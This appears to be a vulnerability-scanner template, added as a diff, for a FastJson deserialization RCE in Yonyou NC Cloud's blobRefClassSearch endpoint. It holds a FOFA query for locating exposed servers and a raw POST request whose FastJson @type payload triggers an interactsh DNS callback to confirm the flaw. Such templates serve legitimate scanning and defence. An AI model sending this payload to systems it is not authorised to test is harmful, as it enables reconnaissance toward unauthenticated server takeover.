@@ -1,0 +1,32 @@
+id: yongyouNC-Cloud_blobRefClassSearch-fastjson
+info:
+  name: 用友NC Cloud blobRefClassSearch FastJson反序列化RCE
+  author: Superhero
+  severity: high
+  description: |-
+    fofa：app="用友-NC-Cloud"
+    用友 NC Cloud blobRefClassSearch 接口处存在FastJson反序列化漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140515845
+  tags: FastJson
+
+http:
+  - raw:
+      - |
+        POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{interactsh-url}}\"}}}"}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
+
+
+
+
+
+
